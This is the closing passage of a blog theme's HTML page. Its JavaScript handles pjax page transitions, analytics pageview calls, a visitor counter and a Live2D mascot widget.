+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
